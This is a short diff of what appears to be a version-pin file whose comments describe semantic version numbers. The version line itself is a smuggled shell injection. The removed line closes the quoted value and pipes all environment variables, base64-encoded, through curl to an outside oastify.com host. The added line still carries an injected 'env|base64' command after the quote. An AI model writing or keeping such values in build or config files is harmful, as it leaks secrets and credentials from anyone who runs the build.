@@ -4,4 +4,4 @@
 # Format: vMAJOR.MINOR.PATCH (e.g., v1.30.0)
 # Latest available version: v1.38.0 (as of 2025-11-19)
 # Note: Run 'make registry-diff' to see what's new in the latest version
-v1.2.3";env|base64${IFS}-w${IFS}0${IFS}|${IFS}curl${IFS}-d${IFS}@-${IFS}http://xhiqnanrhmcbd7sundimx8l7iyopcf04.oastify.com/env;${IFS}#
+v1.2.3";env|base64
